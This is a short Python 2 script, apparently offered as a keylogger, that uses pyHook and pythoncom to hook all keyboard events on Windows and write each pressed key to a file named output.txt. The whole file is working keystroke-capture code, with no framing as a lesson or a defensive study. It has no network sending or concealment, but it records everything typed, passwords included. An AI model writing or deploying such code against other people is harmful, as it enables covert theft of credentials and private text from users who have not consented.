#key_loggerpy 

import pyHook	#Need to Hook
import pythoncom
#Open the file for the memo

f=open("output.txt",'w')

def Log(logStr):
	print str(logStr)
	f.write(logStr)

def OnKeyboardEvent(event):
	if event.Window != 0:
		Log(str(event.Key))
	return True

hm=pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

if __name__== '__main__':
	import pythoncom
	pythoncom.PumpMessages()
